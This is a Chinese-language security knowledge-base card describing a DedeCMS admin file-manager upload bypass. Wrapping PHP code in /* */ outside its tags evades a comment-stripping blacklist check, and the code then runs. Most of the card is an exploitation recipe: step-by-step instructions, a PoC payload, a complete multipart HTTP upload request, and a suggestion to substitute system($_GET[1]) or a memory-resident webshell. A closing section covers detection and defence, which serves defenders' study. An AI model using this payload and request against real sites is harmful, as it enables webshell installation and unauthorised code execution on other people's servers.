---
id: web-generic-file-upload-dedecms-content-check-comment-wrap-bypass
title: DedeCMS 文件管理器上传内容检测绕过：/*<?php ... ?>*/ 逃逸 preg_replace 注释过滤后仍执行 PHP
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-content-check-comment-wrap-php-exec
tags:
- file-upload
- php
- dedecms
- waf-bypass
- comment
- content-filter
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:49:05+08:00'
  notes: 已对照原文核对：8张图全部读取，图02-04确认正常上传成功、<?php ...phpinfo();?>被“文件中存在恶意代码”拦截；图05确认包裹payload上传后phpinfo正常执行(PHP 7.4.3)；图07/08确认源码为xx/file_manage_control.php的fmdo=upload分支；卡中preg_replace注释剔除+黑名单匹配+写盘原文件的机制与原文源码一致；原文未给CMS版本，affected_versions留空正确；dedup候选为DedeCMS模板改名/makehtml/homepageset写入及其他上传绕过，入口与绕过面均不同，非同链。PoC已补充说明原文请求另含上传目录字段需按表单补齐。
url: /docs/web/generic/file-upload/web-generic-file-upload-dedecms-content-check-comment-wrap-bypass/
draft: false
kb_aliases:
- DedeCMS 上传绕过
- 文件管理器 getshell
- 注释包裹绕过上传检测
- preg_replace 注释剔除绕过
- file_manage_control 上传
- 恶意代码检测绕过
---

## 一句话结论

DedeCMS 系后台文件管理器的上传点在写入 `php`/`htm` 文件前会先用 `preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $content)` 删除 `/*...*/` 注释，再对剩下的内容做危险函数黑名单匹配；攻击者把完整 payload 包成 `/*<?php ... ?>*/` 上传，检测时整段被当作注释删掉（无危险函数可匹配），而 PHP 解析时 `/*`/`*/` 位于 `<?php` 标签之外只是普通文本，内部的 `<?php ... ?>` 照常执行，从而绕过检测获得 WebShell/PHP 代码执行。

## 原理

- 上传处理的判断条件是文件后缀为 `php` 或 `htm`：`if (is_file($file) && ($file_ext == "php" || $file_ext == "htm"))`，随后读取文件内容到 `$content`。
- 第一步安全检查是删除注释：`$content = preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $content);`。该正则会把 `/*` 到 `*/` 之间的所有内容（包括 `<?php ... ?>`）从“用于检测的字符串”中删除。
- 第二步用 `$cfg_disable_funs`（`phpinfo,eval,assert,exec,...,[$]_GET,...,include,require,...`）逐个匹配 `$content`；如果匹配到危险函数就 `unlink` 并返回“文件中存在恶意代码”。
- 漏洞点一：检测用的 `$content` 是被注释删除后的副本，而写盘的是原始文件；只要让危险代码全部落在 `/* ... */` 内，检测串就为空，黑名单无从匹配。
- 漏洞点二：PHP 的 `/* ... */` 只有出现在 `<?php ... ?>` 内部才是注释。payload `/*<?php echo "i'm safe again!";phpinfo();?>*/` 中 `/*` 与 `*/` 都在 PHP 标签之外，属于 HTML 文本，不构成注释；中间的 `<?php ... ?>` 是合法 PHP 代码，访问该文件时 `phpinfo()` 正常执行。
- 结果：`<?php echo "i'm danger";phpinfo();?>` 被拦截，而 `/*<?php echo "i'm safe again!";phpinfo();?>*/` 上传成功并执行，验证了“检测内容”与“执行内容”的解析差异。

## 触发条件

- 攻击者已登录后台（文件管理器/附件管理功能可用），或该上传接口可未授权访问。
- 上传点对 php/htm 内容做“先删注释再查函数”的字符串级检测，且写盘内容与检测内容不一致。
- Web 服务器将上传目录中的 `.php` 当 PHP 执行（上传目录未禁用脚本解析）。
- 危险函数黑名单只做字符串匹配，未做 PHP tokenizer/AST 级分析。

## 利用步骤

1. 登录后台，进入 文件管理器 → 文件上传（或附件管理），先上传正常文件确认上传目录与访问 URL。
2. 上传普通恶意内容 `<?php echo "i'm danger";phpinfo();?>`，确认被拦截并返回“文件中存在恶意代码”。
3. 将 payload 用 PHP 标签外的注释包裹后上传：
   ```php
   /*<?php echo "i'm safe again!";phpinfo();?>*/
   ```
   检测阶段 `preg_replace` 把整段删除，黑名单不命中，文件写盘成功。
4. 访问上传后的 `.php` 文件路径，PHP 解析时执行其中的 `<?php ... ?>`（示例中 `phpinfo()` 正常输出），确认代码执行。
5. 把 `phpinfo()` 替换为任意 PHP 代码（如 `system($_GET[1])`、文件管理/内存马）；只要整段代码都落在 `/* ... */` 包裹内，检测串同样为空，危险函数黑名单不会命中。若只能部分包裹，再配合变量函数/字符串混淆等技巧。

## PoC

> 以下为最小字段示例；原文实际请求还携带上传目录字段（截图中的 `activepath` 类字段）与提交按钮字段，需按目标后台表单补齐。

```php
/*<?php echo "i'm safe again!";phpinfo();?>*/
```

```http
POST /<admin-dir>/file_manage_control.php HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="fmdo"

upload
------WebKitFormBoundary
Content-Disposition: form-data; name="upfile"; filename="safe.php"
Content-Type: application/octet-stream

/*<?php echo "i'm safe again!";phpinfo();?>*/
------WebKitFormBoundary--
```

## 变体与关联

- 变体：如果过滤还会删除其它“注释”或标签，可用同样思路寻找“过滤器认为无效、PHP 实际执行”的差异（如 HTML 注释、`?>` 截断、短标签等）。
- 变体：检测只做字符串替换时，可用等价函数名/变量函数/编码混淆绕过剩余黑名单（见关联的 webshell 字符串混淆卡）。
- 关联：[[web-generic-file-upload-dedecms-template-rename-php-waf-fileread]]（DedeCMS 后台模板改名写 php + WAF 拦截危险函数时的替代利用）、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（DedeCMS 模板标签写入时的 substr/replace 绕过）、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（字符串混淆规避危险函数检测）。
- 边界：上传目录禁止 PHP 执行（`php_admin_flag engine off`）、检测改为 PHP tokenizer/AST 或对写盘内容做同一份校验、文件管理功能被移除时失效。

## 检测与防御

- 检测：上传的 `.php` 文件中出现 `/*<?php`、`?>*/` 等“标签外注释包裹”结构；文件内容与检测日志不一致；WebShell 访问特征（phpinfo、命令执行参数）。
- 防御：不要用正则删注释后做黑名单，改用 PHP tokenizer/白名单校验，且必须校验最终写入的同一份内容；上传目录移出 Web 根或关闭脚本执行；限制上传类型为图片并重编码；后台文件管理器按最小权限使用；对上传文件做静态扫描与完整性监控。
